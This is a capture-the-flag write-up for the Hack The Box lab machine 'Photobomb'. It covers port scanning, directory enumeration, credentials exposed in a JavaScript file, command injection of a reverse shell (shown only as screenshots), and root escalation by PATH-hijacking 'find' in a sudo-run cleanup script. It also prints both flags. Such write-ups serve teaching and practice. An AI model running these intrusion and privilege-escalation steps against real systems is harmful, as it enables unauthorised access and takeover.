![Photobomb.PNG](/assets/PhotoBomb/photobomb.jpg)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.182
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.182
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

3. Add to `/etc/hosts` IP address machine and `photobomb.hbt`

![Photobomb](/assets/PhotoBomb/photobomb-host.PNG)

4. Use **feroxbuster** to enum directories of web site

```bash
┌──(root㉿est)-[/home/kali/Desktop/Photobomb]
└─| feroxbuster -u http://photobomb.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -e
```

**Output**
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://photobomb.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
401      GET        7l       12w      188c http://photobomb.htb/printer
200      GET        7l       27w      339c http://photobomb.htb/photobomb.js
200      GET       22l       95w      843c http://photobomb.htb/
200      GET        3l       22w    10990c http://photobomb.htb/favicon.ico
401      GET        7l       12w      188c http://photobomb.htb/printers
[####################] - 18s     9552/9552    0s      found:5       errors:0      
[####################] - 18s     4714/4714    260/s   http://photobomb.htb 
[####################] - 17s     4714/4714    271/s   http://photobomb.htb/ 
```

5. Access `http://photobomb.htb/photobomb.js`
![Photobomb-dir.PNG](/assets/PhotoBomb/photobomb-dir.PNG)
* Obtained a user **pH0t0** and password **b0Mb!** to login

6. After login, click on

![Photobomb-button.PNG](/assets/PhotoBomb/photobomb-button.PNG)

and analize with **BurpSuite**

![Photobomb-burp.PNG](/assets/PhotoBomb/photbomb-burp.PNG)

7. We can inject a code of reverse shell, use **https://www.revshells.com/** 
![Photobomb-rev.PNG](/assets/PhotoBomb/photobomb-rev.PNG)
> Use you **tun0** IP address


8. Listen on port of you reverse shell and inject code of reverse shell on petition
![Photobomb-inject.PGN](/assets/PhotoBomb/photobomb-inject.PNG)

9. Spawn a `/bin/bash` on reverse shell
```bash
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

**Output**
```bash
wizard@photobomb:~/photobomb$ 
```

10. Obtain a **user flag**
```bash
wizard@photobomb:~$ cd ~          
cd ~
wizard@photobomb:~$ ls
ls
photobomb  user.txt
wizard@photobomb:~$ cat user.txt
cat user.txt
4ea3bdd71c3d24ff0fca5aeb1a0230aa
```


11. To obtain a system flag look **cleanup.sh** file
```bash
wizard@photobomb:/$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

12. Manipulate a find binary to get a **/bin/bash** how root
```bash
wizard@photobomb:~/photobomb$ cd /tmp 
cd /tmp
wizard@photobomb:/tmp$ echo "/bin/bash" > find
echo "/bin/bash" > find
wizard@photobomb:/tmp$ chmod +x find 
chmod +x find
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

**Output**
```bash
root@photobomb:/home/wizard/photobomb#
```
> Obtained a shell how root

13. Cat a **system flag**
```bash
root@photobomb:/# cd /root
cd /root
root@photobomb:~# ls
ls
root.txt
root@photobomb:~# cat root.txt
cat root.txt
a06bfbdbc0e5f305046a9ae7e725bd7b
```